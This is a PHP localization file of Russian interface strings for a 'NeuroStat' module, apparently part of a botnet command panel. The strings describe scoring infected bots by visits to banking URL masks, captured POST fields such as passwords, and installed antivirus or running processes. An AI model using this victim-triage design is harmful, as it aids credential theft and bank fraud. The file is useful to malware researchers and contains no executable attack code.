<?php
# _blockAnalysesList
define('LNG_NEUROSTAT_ANALYSESLIST',                                                            'Исследования');
define('LNG_NEUROSTAT_ANALYSESLIST_ADD',                                                        'Новый анализ');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_NAME',                                                    'Название');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_DAYS',                                                    'Дни');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_BOTONLINE',                                               'Бот был онлайн, дней');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_DATES',                                                   'Даты');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_ACCOUNT',                                                 'Аккаунт');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_PROFILES',                                                'Профили');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_BOTS',                                                    'Боты');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_LAUNCHED',                                                'Запущен');
define('LNG_NEUROSTAT_ANALYSESLIST_TH_STATE',                                                   'Состояние');
define('LNG_NEUROSTAT_ANALYSESLIST_DAYS_NOTODAY',                                               ', кроме сегодня');
define('LNG_NEUROSTAT_ANALYSESLIST_LAUNCHED_NEVER',                                             'Никогда');
define('LNG_NEUROSTAT_ANALYSESLIST_LAUNCHED_IDLE',                                              'Лентяйничает');

# _blockProfilesList
define('LNG_NEUROSTAT_PROFILE_LIST',                                                            'Профили');
define('LNG_NEUROSTAT_PROFILE_LIST_ADD',                                                        'Новый профиль');
define('LNG_NEUROSTAT_PROFILE_LIST_TH_NAME',                                                    'Название');
define('LNG_NEUROSTAT_PROFILE_LIST_TH_CRITERIA',                                                'Критерии');

# _blockCriteriaList
define('LNG_NEUROSTAT_CRITERIA_LIST',                                                           'Критерии');
define('LNG_NEUROSTAT_CRITERIA_LIST_ADD',                                                       'Новый критерий');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_TITLE',                                                  'Название');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_SETUP',                                                  'Настройка');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_DAYS_LIMIT',                                             'Дни');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_POINTS',                                                 'Баллы');
define('LNG_NEUROSTAT_CRITERIA_LIST_TH_STATISTICAL_METHOD',                                     'Статистический метод');
define('LNG_NEUROSTAT_CRITERIA_LIST_EACH',                                                      'каждый');

# Misc
define('LNG_NEUROSTAT_ANALYSIS_FINISHED',                                                       'НейроАнализ "<a href=":analysis_link" target="_blank">:analysis_name</a>" завершён за: :time');
define('LNG_NEUROSTAT_ANALYSIS_BOTID_FINISHED',                                                 'НейроАнализ бота "<a href=":analysis_link" target="_blank">:botId</a>" finished in: :time');

# CRUD: Analysis
define('LNG_NEUROSTAT_ANALYSIS_NAME',                                                            'Название');
define('LNG_NEUROSTAT_ANALYSIS_PROFILES',                                                        'Профили');
define('LNG_NEUROSTAT_ANALYSIS_DAYS',                                                            'Дни');
define('LNG_NEUROSTAT_ANALYSIS_DAYS_DESCR',                                                      'Количество дней обработки отчётов');
define('LNG_NEUROSTAT_ANALYSIS_BOTONLINE',                                                       'Бот был онлайн, Дней');
define('LNG_NEUROSTAT_ANALYSIS_BOTONLINE_DESCR',                                                 'Анализировать только ботов которые были онлайн за последние X дней');
define('LNG_NEUROSTAT_ANALYSIS_BOTONLINE_HINT',                                                  'Число дней. Пусто: анализировать всех ботов');
define('LNG_NEUROSTAT_ANALYSIS_NOTODAY',                                                         'Игнорировать сегодняшние отчёты');
define('LNG_NEUROSTAT_ANALYSIS_NOTODAY_LABEL',                                                   'Не обрабатывать отчёты за сегодня для исключения блокировки таблиц БД');
define('LNG_NEUROSTAT_ANALYSIS_ACCOUNT',                                                         'Аккаунт');
define('LNG_NEUROSTAT_ANALYSIS_ACCOUNT_URLS',                                                    'URLs');
define('LNG_NEUROSTAT_ANALYSIS_ACCOUNT_URLS_DESCR',                                              'Обрабатывать только ботов, посещавших любой из указанных URLов. Поддерживается Wildcard: `?*`.');
define('LNG_NEUROSTAT_ANALYSIS_BUTTON_UPDATE',                                                   'Обновить');
define('LNG_NEUROSTAT_ANALYSIS_BUTTON_CREATE',                                                   'Создать');

# CRUD: Profile
define('LNG_NEUROSTAT_PROFILE_NAME',                                                            'Название');
define('LNG_NEUROSTAT_PROFILE_CRITERIA',                                                        'Критерии');
define('LNG_NEUROSTAT_PROFILE_BUTTON_UPDATE',                                                   'Обновить');
define('LNG_NEUROSTAT_PROFILE_BUTTON_CREATE',                                                   'Создать');

# CRUD: All criteria
define('LNG_NEUROSTAT_CRITERION_TITLE',                                                         'Название');
define('LNG_NEUROSTAT_CRITERION_TITLE_HINT',                                                    'Название, произвольное');
define('LNG_NEUROSTAT_CRITERION_TYPE',                                                          'Критерий');
define('LNG_NEUROSTAT_CRITERION_TYPE_HINT',                                                     'Используемый алгоритм критерия');
define('LNG_NEUROSTAT_CRITERION_SETS',                                                          'Настройки критерия');
define('LNG_NEUROSTAT_CRITERION_SETS_UNDEFINED',                                                'Не задат тип критерия! Пожалуйста, выберите для отображения дополнительных настроек');

define('LNG_NEUROSTAT_CRITERION_POINTS',                                                        'Баллы');
define('LNG_NEUROSTAT_CRITERION_POINTS_HINT',                                                   'Баллы, назначаемые боту при выполнении критерия');
define('LNG_NEUROSTAT_CRITERION_NEGATED',                                                       'Отрицание');
define('LNG_NEUROSTAT_CRITERION_NEGATED_HINT',                                                  'Отрицание условия: баллы назначаются когда критерий не выполняется');
define('LNG_NEUROSTAT_CRITERION_DAYSLIMIT',                                                     'Лимит дней');
define('LNG_NEUROSTAT_CRITERION_DAYSLIMIT_HINT',                                                'Ограничить критерий отчётами за последние X дней');
define('LNG_NEUROSTAT_CRITERION_STAT',                                                          'Статистический метод');
define('LNG_NEUROSTAT_CRITERION_STAT__NO',                                                      'No: Каждое выполнение даёт N баллов');
define('LNG_NEUROSTAT_CRITERION_STAT__SUM',                                                     'Sum: Общее количество подходящих отчётов');
define('LNG_NEUROSTAT_CRITERION_STAT__DAYS',                                                    'Days: Число активных дней');
define('LNG_NEUROSTAT_CRITERION_STAT__AVG_DAY',                                                 'Avg/Day: Среднее число выполнений за день');
define('LNG_NEUROSTAT_CRITERION_STAT__AVG_WEEK',                                                'Avg/Week: Среднее число выполнений за неделю');
define('LNG_NEUROSTAT_CRITERION_STAT__DAYS_WEEK',                                               'Days/Week: Среднее число активных дней за неделю');
define('LNG_NEUROSTAT_CRITERION_STAT_HINT',
    'Выберите статистический метод для обработки собранных данных. Боту назначается N баллов если ... '.
    '<ul>'.
    '<li><b>No</b>: ... критерий выполняется для отчёта ; '.
    '<li><b>sum</b>: ... число подходящих отчётов превышает заданное пороговое значение ; '.
    '<li><b>days</b>: ... число активных дней (содержащих подходящие отчёты) превышает пороговое значение ; '.
    '<li><b>avg/day</b>: ... среднее число подходящих отчётов за день превышает пороговое значение ; '.
    '<li><b>avg/week</b>: ... среднее число подходящих отчётов за неделю превышает пороговое значение ; '.
    '<li><b>days/week</b>: ... среднее число активных дней (содержащих подходящие отчёты) в неделю превышает пороговое значение; '.
    '</ul>'
);
define('LNG_NEUROSTAT_CRITERION_OPERATOR_THRESHOLD',                                            'Условие на пороговое значение');
define('LNG_NEUROSTAT_CRITERION_OPERATOR_THRESHOLD_HINT',
    'При использовании статистического метода, установите пороговое значение и оператор сравнения.'.
    'N баллов будут назначены боту только когда статистика подходит к заданному пороговому условию.'
);
define('LNG_NEUROSTAT_CRITERION_BUTTON_UPDATE',                                                 'Обновить');
define('LNG_NEUROSTAT_CRITERION_BUTTON_CREATE',                                                 'Сохранить');

# CRUD: Bot criteria
define('LNG_NEUROSTAT_CRITERION_FIRSTREPORT',                                                   'Бот: Время первого отчёта');
define('LNG_NEUROSTAT_CRITERION_FIRSTREPORT_DESCR',                                             'Условие на время первого отчёта от бота');
define('LNG_NEUROSTAT_CRITERION_FIRSTREPORT_SET_DAYS',                                          'Получен .. дней назад');
define('LNG_NEUROSTAT_CRITERION_LASTREPORT',                                                    'Бот: Время последнего отчёта');
define('LNG_NEUROSTAT_CRITERION_LASTREPORT_DESCR',                                              'Условие на время последнего отчёта от бота');
define('LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE',                                               'Бот: Средний онлайн в неделю');
define('LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE_DESCR',                                         'Условие на среднее время онлайн бота в неделю');
define('LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE_SET_HOURS',                                     'Часов в неделю');

# CRUD: Report criteria
define('LNG_NEUROSTAT_CRITERION_REPORT_TYPE',                                                   'Тип отчёта');
define('LNG_NEUROSTAT_CRITERION_REPORT_TYPE_DESCR',                                             'Выбирает отчёты по типу');
define('LNG_NEUROSTAT_CRITERION_REPORT_TYPE_SET_TYPE',                                          'Тип отчёта');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS',                                               'Тело отчёта');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_DESCR',                                         'Выбирает отчёты по содержимому');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_SET_CONTENTS',                                  'Маска на тело отчёта');
define('LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_SET_CONTENTS_HINT',                             'Одна маска на строке. Поддерживается Wildcard `?*`. Пример: password*');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT',                                                      'Установленное ПО');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT_DESCR',                                                'Условие на список установленного софта');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT_SET_SOFTWARE',                                         'Маски названий ПО');
define('LNG_NEUROSTAT_CRITERION_INSTSOFT_SET_SOFTWARE_HINT',                                    'Одна маска на строке. Поддерживается Wildcard `?*`. Пример: Avast*');
define('LNG_NEUROSTAT_CRITERION_TASKLIST',                                                      'Запущенные приложения');
define('LNG_NEUROSTAT_CRITERION_TASKLIST_DESCR',                                                'Условие на список запущенных приложений (из `tasklist` CMD команды)');
define('LNG_NEUROSTAT_CRITERION_TASKLIST_SET_SOFTWARE',                                         'Маски названий процессов');
define('LNG_NEUROSTAT_CRITERION_TASKLIST_SET_SOFTWARE_HINT',                                    'Одна маска на строке. Поддерживается Wildcard `?*`. Пример: Avast*.exe');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL',                                                 'HTTP URL посещение');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_DESCR',                                           'Посещение ботом одной из указанных масок URL');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_SET_URLMASK',                                     'Маски URL');
define('LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_SET_URLMASK_HINT',                                'Одна маска на строке. Поддерживается Wildcard `?*`. Пример: htt?://*.bank.com/*');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA',                                                 'HTTP POST данные');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_DESCR',                                           'Отправка ботом данных через POST на одну из указанных масок URL, с любыми из данных масок полей POST');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_SET_POSTMASK',                                    'Маски данных POST');
define('LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_SET_POSTMASK_HINT',                               'Одна маска на строке. Поддерживается Wildcard `?*`. Пример: password*');
